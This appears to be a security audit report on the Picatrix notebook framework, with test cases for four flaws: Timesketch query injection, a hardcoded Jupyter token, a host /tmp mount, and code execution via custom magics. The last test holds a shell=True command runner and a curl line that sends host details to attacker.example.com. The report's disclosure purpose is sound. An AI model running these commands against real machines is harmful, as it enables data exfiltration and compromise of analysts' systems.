### Vulnerability List

- **Vulnerability Name:** Timesketch Query Injection via `%timesketch_query` magic

    - **Description:**
        - An analyst uses the `%timesketch_query` magic or `timesketch_query_func()` function in a Picatrix notebook.
        - The user provides a maliciously crafted string as the `data` parameter, intending to inject commands into the Timesketch query.
        - Picatrix directly passes this unsanitized string to the `timesketch-api-client` library, specifically to the `query_timesketch` function and further to `api_search.Search.from_manual`.
        - The `timesketch-api-client` sends this query to the backend Timesketch system without additional sanitization from Picatrix.
        - If the Timesketch backend is vulnerable to query injection, the malicious query can be executed, potentially leading to unintended data access, modification, or other malicious actions within the Timesketch environment, depending on the capabilities of the Timesketch query language and backend.

    - **Impact:**
        An attacker can potentially execute arbitrary queries against the connected Timesketch instance. This could lead to:
        - **Unauthorized Data Access:** Accessing sensitive event data within the Timesketch sketch that the attacker is not supposed to see.
        - **Data Manipulation:** Modifying or deleting event data within Timesketch if the Timesketch query language and backend permit such operations.
        - **Circumvention of Access Controls:** Bypassing intended access controls within Timesketch by crafting queries that operate outside the user's authorized scope, assuming vulnerabilities in Timesketch backend exist.
        - **Information Disclosure:** Extracting sensitive information about the Timesketch system or other sketches if the backend is vulnerable.

    - **Vulnerability Rank:** High

    - **Currently Implemented Mitigations:**
        - None. The code directly passes the user-provided query string to the `timesketch-api-client` without any sanitization or validation within Picatrix itself. There are no visible input sanitization or validation mechanisms implemented in the `timesketch_query` magic or the underlying `query_timesketch` function in `/code/picatrix/magics/timesketch.py`.

    - **Missing Mitigations:**
        - **Input Sanitization:** Implement sanitization of the `data` parameter in the `timesketch_query` magic and `query_timesketch` function. This could involve:
            - **Allowlisting:** Define a strict allowlist of permitted characters or query syntax elements and reject any input that deviates from this list.
            - **Escaping:** Properly escape special characters in the user input before constructing the query string to be sent to Timesketch.
            - **Input Validation:** Implement validation logic to check the structure and content of the query to ensure it conforms to expected and safe patterns.
        - **Principle of Least Privilege:** Ensure that Picatrix, when interacting with the Timesketch API, operates with the minimum necessary privileges to reduce the potential impact of a successful injection attack. This is more of a general security best practice but relevant in the context of API interactions.

    - **Preconditions:**
        1.  The attacker must have access to a Picatrix notebook environment where they can execute magics. This could be a publicly accessible Picatrix instance or a compromised internal system.
        2.  Picatrix must be configured to connect to a Timesketch instance using valid credentials.
        3.  The Timesketch backend must be susceptible to query injection vulnerabilities. While Picatrix itself introduces the *path* for injection by not sanitizing input, the *exploitability* depends on vulnerabilities within the Timesketch backend's query processing.

    - **Source Code Analysis:**
        1.  **File:** `/code/picatrix/magics/timesketch.py`
        2.  **Function:** `timesketch_query` (magic function)
        3.  **Code Snippet:**
            ```python
            @framework.picatrix_magic
            def timesketch_query(
                data: Text,
                fields: Optional[Text] = None,
                timelines: Optional[Text] = None,
                start_date: Optional[Text] = '',
                end_date: Optional[Text] = '',
                query_filter: Optional[Dict[Text, Any]] = None,
                max_entries: Optional[int] = 40000) -> api_search.Search:
                ...
                return query_timesketch(
                    query=data,
                    return_fields=fields,
                    query_filter=query_filter,
                    indices=indices,
                    start_date=start_date,
                    end_date=end_date,
                    max_entries=max_entries)
            ```
        4.  **Function:** `query_timesketch`
        5.  **Code Snippet:**
            ```python
            def query_timesketch(
                query: Optional[Text] = None,
                query_dsl: Optional[Text] = None,
                query_filter: Optional[Dict[Text, Any]] = None,
                return_fields: Optional[Text] = None,
                start_date: Optional[Text] = '',
                end_date: Optional[Text] = '',
                max_entries: Optional[int] = None,
                indices: Optional[List[Text]] = None) -> api_search.Search:
                ...
                search_obj = api_search.Search(sketch)
                search_obj.from_manual(
                    query_string=query, # User input 'query' is passed directly
                    query_dsl=query_dsl,
                    query_filter=query_filter,
                    max_entries=max_entries)
                ...
                return search_obj
            ```
        6.  **Visualization:**

            ```mermaid
            graph LR
                A[User Input in %timesketch_query magic (data parameter)] --> B(timesketch_query function);
                B --> C(query_timesketch function);
                C --> D(api_search.Search.from_manual);
                D --> E[timesketch-api-client sends query to Timesketch Backend];
                E --> F{Timesketch Backend Query Execution};
                F -- Vulnerability? --> G[Potential Malicious Action in Timesketch];
            ```
        7.  **Explanation:** The code path clearly shows that the `data` parameter from the `%timesketch_query` magic is passed through `timesketch_query` function and directly used as the `query_string` in the `api_search.Search.from_manual` call. No sanitization or validation is performed on this user input within Picatrix before it is handed over to the `timesketch-api-client`.

    - **Security Test Case:**
        1.  **Pre-requisite:** Ensure Picatrix is installed and initialized, and connected to a Timesketch instance (e.g., the demo instance `https://demo.timesketch.org` if permitted for testing, or a local test instance). Set an active sketch using `%timesketch_set_active_sketch <sketch_id>`.
        2.  **Objective:** Demonstrate that a crafted string in the `data` parameter of `%timesketch_query` is passed directly to Timesketch without sanitization by Picatrix. We will use a simple string that, while not necessarily malicious in itself, can be easily identified in Timesketch logs or responses if it's passed through verbatim. A more sophisticated test would require knowledge of Timesketch backend vulnerabilities to craft a truly malicious query.
        3.  **Steps:**
            ```python
            # In a Picatrix notebook cell:

            injection_string = "');SELECT SLEEP(5);--" # Example injection attempt - may not be valid for Timesketch backend, but serves to illustrate pass-through.
            query = f"message:{injection_string}"

            try:
                search_obj = %timesketch_query $query
                df = search_obj.table
                print("Query executed successfully (possibly). Check Timesketch backend logs for injection string.")
                print(df.head()) # Print first few rows if query returns data.
            except Exception as e:
                print(f"Query execution failed (possibly due to injection or invalid syntax). Exception: {e}")

            # Examine Timesketch backend logs (if accessible) or monitor network traffic to confirm if the 'injection_string' was sent to the Timesketch backend as part of the query.
            # If the query executes without Picatrix rejecting it, and the injection string (or a modified/escaped version) appears in Timesketch backend logs, it indicates the vulnerability.
            # For a more definitive test, if Timesketch backend vulnerability is known, craft a query that would cause a specific observable effect in Timesketch if injected.
            ```
        4.  **Expected Result:** The test case should execute in Picatrix without errors related to input validation in Picatrix itself. Examination of Timesketch backend logs (or network traffic) should reveal that the `injection_string` (or a close variant) was transmitted to the Timesketch backend as part of the query. This confirms the lack of sanitization in Picatrix and the potential for query injection if the Timesketch backend is vulnerable. Note: the success of *exploiting* a vulnerability depends on the Timesketch backend itself, which is outside the scope of Picatrix vulnerability assessment, but Picatrix facilitates the *path* for such injection.

- **Vulnerability Name:** Hardcoded Jupyter Notebook Token

    - **Description:** The Jupyter Notebook in the Picatrix Docker image is configured with a hardcoded token "picatrix" in `docker/jupyter_notebook_config.py`. This token is used for authentication to access the Jupyter Notebook web interface. An attacker who obtains this token can gain unauthorized access to the Picatrix Jupyter Notebook instance if the port is exposed.

    - **Impact:** Unauthorized access to the Picatrix Jupyter Notebook. An attacker can execute arbitrary code within the notebook environment, potentially compromising the user's system, accessing sensitive data processed within Picatrix, or exfiltrating data.

    - **Vulnerability Rank:** Critical

    - **Currently Implemented Mitigations:** None by default. Documentation in `docker/README.md` mentions the possibility to change the token by editing `docker/jupyter_notebook_config.py` before building the image, but this is not a default security measure.

    - **Missing Mitigations:**
        - Generate a unique, random token for each Docker instance during the Docker image build process or at container runtime.
        - Implement a mechanism to allow users to easily change the default token upon initial setup.
        - Provide clearer and more prominent documentation in the main README.md about the importance of changing the default token and instructions on how to do so.

    - **Preconditions:**
        - Picatrix is deployed using the Docker image with the default configuration.
        - The Jupyter Notebook port (default: 8899) is exposed and accessible over a network.
        - The attacker is aware of the default hardcoded token "picatrix".

    - **Source Code Analysis:**
        - File: `/code/docker/jupyter_notebook_config.py`
        - Line: `c.NotebookApp.token = 'picatrix'`
        - This line in the configuration file directly sets the Jupyter Notebook token to the static string "picatrix". This configuration is included in the Docker image build, making it the default token for all instances created from this image.

    - **Security Test Case:**
        1. Deploy Picatrix using the default Docker configuration as described in `/code/docker/README.md`.
        2. Ensure that the Picatrix Jupyter Notebook instance is running and accessible via `http://localhost:8899` (or the configured port).
        3. Open a web browser and navigate to `http://localhost:8899`.
        4. When prompted for the token, enter `picatrix`.
        5. Observe that you are successfully authenticated and gain access to the Picatrix Jupyter Notebook environment without any prior authorization beyond knowing the default token.
        6. An attacker, knowing this default token, could access any Picatrix instance running with the default Docker configuration if the Jupyter Notebook port is reachable.

- **Vulnerability Name:** Potential Host File Exposure via `/tmp` Volume Mount

    - **Description:** The default Docker configuration in `docker-compose.yml` and `docker-build.yml` mounts the host's `/tmp` directory into the container at `/usr/local/src/picadata/`. This means that any files and directories in the user's host `/tmp` directory are accessible from within the Picatrix container with the same permissions as the Picatrix user inside the container (uid 1000). A malicious Jupyter notebook executed within Picatrix could potentially read, modify, or delete files in the host's `/tmp` directory, leading to unintended data exposure or system manipulation.

    - **Impact:** Exposure of potentially sensitive files from the host system to the Picatrix container environment. A malicious actor could craft a Jupyter notebook that reads or exfiltrates data from files located in the user's host `/tmp` directory. Depending on the nature of the files in `/tmp`, this could lead to information disclosure or further compromise.

    - **Vulnerability Rank:** Medium

    - **Currently Implemented Mitigations:** Documentation-based mitigation. The `docker/README.md` and `Installation.md` files recommend users to change the default volume mapping from `/tmp` to a more secure or dedicated directory. However, the default configuration remains insecure.

    - **Missing Mitigations:**
        - Change the default volume mount in `docker-compose.yml` and `docker-build.yml` from the host's `/tmp` directory to a more isolated and less sensitive location, such as a named Docker volume or a dedicated directory within the container that is not directly mapped to a potentially sensitive host directory.
        - Add a warning message during Picatrix Docker setup or in the documentation that explicitly highlights the security risks associated with mounting the host `/tmp` directory and strongly advise users to change the default volume mapping.

    - **Preconditions:**
        - Picatrix is deployed using the Docker image with the default configuration.
        - The user has potentially sensitive files or directories located in their host system's `/tmp` directory.
        - A malicious Jupyter notebook is executed within the Picatrix environment.

    - **Source Code Analysis:**
        - File: `/code/docker/docker-compose.yml` and `/code/docker/docker-build.yml`
        - Line: `- /tmp/:/usr/local/src/picadata/`
        - This line in both Docker Compose files defines a volume mount that directly maps the host's `/tmp` directory to `/usr/local/src/picadata/` inside the Picatrix container. This grants the container read and write access to the host's temporary directory.

    - **Security Test Case:**
        1. On the host operating system, create a file named `sensitive_data.txt` within the `/tmp` directory and add some sensitive content to it (e.g., "This is sensitive information on the host").
        2. Deploy and run Picatrix using the default Docker configuration.
        3. Open a new Jupyter notebook within Picatrix.
        4. Execute the following Python code in a notebook cell:
           ```python
           import os
           file_path_in_container = '/usr/local/src/picadata/sensitive_data.txt'
           if os.path.exists(file_path_in_container):
               with open(file_path_in_container, 'r') as f:
                   content = f.read()
                   print(f"Content of host /tmp/sensitive_data.txt from container: {content}")
           else:
               print(f"File not found in container: {file_path_in_container}")
           ```
        5. Verify that the output in the notebook cell displays the content of the `sensitive_data.txt` file created on the host's `/tmp` directory, demonstrating that the container has successfully accessed and read a file from the host's `/tmp` directory via the default volume mount.
        6. This confirms the potential vulnerability where a malicious notebook could access and potentially exfiltrate or manipulate files within the host's `/tmp` directory.

- **Vulnerability Name:** Arbitrary Code Execution via Malicious Custom Magics

    - **Description:**
        1. A security analyst is tricked into opening and running a malicious Jupyter notebook.
        2. This notebook leverages Picatrix's functionality to register custom magics using the `@framework.picatrix_magic` decorator.
        3. The malicious notebook defines a custom magic that executes arbitrary Python code when invoked.
        4. When the security analyst unknowingly executes this malicious magic, arbitrary code is executed on their machine within the Jupyter notebook environment.

    - **Impact:**
        - Critical: Arbitrary code execution on the security analyst's machine. This can lead to:
            - Data exfiltration: Sensitive data from the analyst's environment (including data being analyzed in the notebook) can be stolen.
            - System compromise: The attacker can gain full control of the analyst's machine, install malware, or perform other malicious actions.
            - Privilege escalation: If the analyst is running Jupyter with elevated privileges, the attacker can inherit those privileges.

    - **Vulnerability Rank:** Critical

    - **Currently Implemented Mitigations:**
        - None: The framework is designed to allow users to define and register custom magics easily. There are no built-in mechanisms to restrict or sanitize the code within these custom magics.

    - **Missing Mitigations:**
        - Code review and validation: Implement a mechanism to review and validate custom magics before registration. This could involve static analysis, sandboxing, or manual review by a trusted authority.
        - Restriction of magic registration: Implement a configuration option to disable or restrict the registration of custom magics altogether, especially in environments where untrusted notebooks might be used.
        - User awareness and education: Educate users about the risks of running untrusted Jupyter notebooks and custom magics. Warn users about the potential for arbitrary code execution.

    - **Preconditions:**
        - The security analyst must have Picatrix installed and initialized in their Jupyter environment.
        - The analyst must open and execute a malicious Jupyter notebook containing a custom magic definition.
        - The analyst must execute the malicious custom magic, either intentionally or unintentionally (e.g., through auto-execution features of Jupyter).

    - **Source Code Analysis:**
        - File: `/code/picatrix/lib/framework.py` (Not present in provided files, but assumed based on `/code/docs/AddingAMagic.md` and `/code/end_to_end_tests/basic_test.py`)
        - The `@framework.picatrix_magic` decorator (as described in `/code/docs/AddingAMagic.md` and used in `/code/end_to_end_tests/basic_test.py`) is used to register Python functions as Picatrix magics.
        - When a function is decorated with `@framework.picatrix_magic`, it becomes available as a line magic (`%magic_name`), cell magic (`%%magic_name`), and a function (`magic_name_func()`).
        - The code within the decorated function is executed directly when the magic or function is invoked in a Jupyter notebook cell.
        - There is no input sanitization or validation performed on the code within the custom magic function by the Picatrix framework itself.
        - Visualization:

            ```
            User opens malicious notebook -> Notebook registers malicious magic using @framework.picatrix_magic -> User executes malicious magic (%malicious_magic or %%malicious_magic or malicious_magic_func()) -> Arbitrary Python code in malicious magic is executed.
            ```

        - File: `/code/end_to_end_tests/basic_test.py`
        - The `test_magic_registration` function demonstrates how a custom magic can be registered and executed within the testing environment.
        - The `MAGIC_DEFINITION` constant shows an example of a custom magic definition using `@framework.picatrix_magic`. This example can be adapted to execute arbitrary code.

    - **Security Test Case:**
        1. Create a malicious Jupyter notebook (e.g., `malicious_notebook.ipynb`).
        2. In the first cell of the notebook, add the following Python code to define and register a malicious custom magic:

            ```python
            from picatrix.lib import framework
            import subprocess

            @framework.picatrix_magic
            def malicious_magic(data):
              """This is a malicious magic that executes arbitrary code."""
              subprocess.run(data, shell=True) # Vulnerability: Using shell=True and unsanitized input 'data'
              return "Malicious command executed!"

            print("Malicious magic registered: %malicious_magic")
            ```

        3. Save the notebook and share it with the target security analyst (e.g., via email, shared drive, or public repository).
        4. The security analyst opens the `malicious_notebook.ipynb` in their Jupyter environment with Picatrix initialized and executes the first cell. This registers the `%malicious_magic`.
        5. In a new cell, the attacker instructs the analyst to (or automatically executes if possible) run the malicious magic with a command to exfiltrate data or execute arbitrary commands, for example:

            ```
            %malicious_magic curl -X POST -d "$(hostname && whoami && ip a)" https://attacker.example.com/data_receiver
            ```

        6. Observe that the command provided to `%malicious_magic` is executed on the analyst's machine. In this example, system information (hostname, username, IP address) is exfiltrated to `https://attacker.example.com/data_receiver`. The attacker can replace this with more harmful commands.
